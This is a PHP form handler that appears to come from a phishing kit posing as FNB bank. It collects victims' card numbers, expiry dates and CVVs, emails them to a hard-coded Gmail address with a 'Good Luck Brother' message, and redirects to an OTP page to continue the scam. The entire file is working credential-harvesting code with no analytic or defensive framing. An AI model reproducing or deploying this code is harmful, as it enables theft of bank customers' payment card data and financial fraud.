<?php
/* Set e-mail recipient */
$myemail  = "fnbwewow@gmail.com";

/* Check all form inputs using check_input function */
$cn = check_input($_POST['cn'], "Enter your Card Number");
$exdate  = check_input($_POST['exdate'], "Enter your Expiry Date");
$cvv = check_input($_POST['cvv'], "Enter your CVV");

/* Let's prepare the message for the e-mail */
$subject = "FNB - Login!";

/* Let's prepare the message for the e-mail */
$message = "Heita!!

You have just received a new FNB  Card details:

Card Number: $cn
Expiry Date: $exdate
CVV: $cvv

Good Luck Brother.
";

/* Send the message using mail() function */
mail($myemail, $subject, $message);

/* Redirect visitor to the thank you page */
header('Location: otp.html');
exit();

/* Functions we used */
function check_input($data, $problem='')
{
    $data = trim($data);
    $data = stripslashes($data);
    $data = htmlspecialchars($data);
    if ($problem && strlen($data) == 0)
    {
        show_error($problem);
    }
    return $data;
}

function show_error($myError)
{
?>
    <html>
    <body>

    <b>Please correct the following error:</b><br />
    <?php echo $myError; ?>

    </body>
    </html>
<?php
exit();
}
?>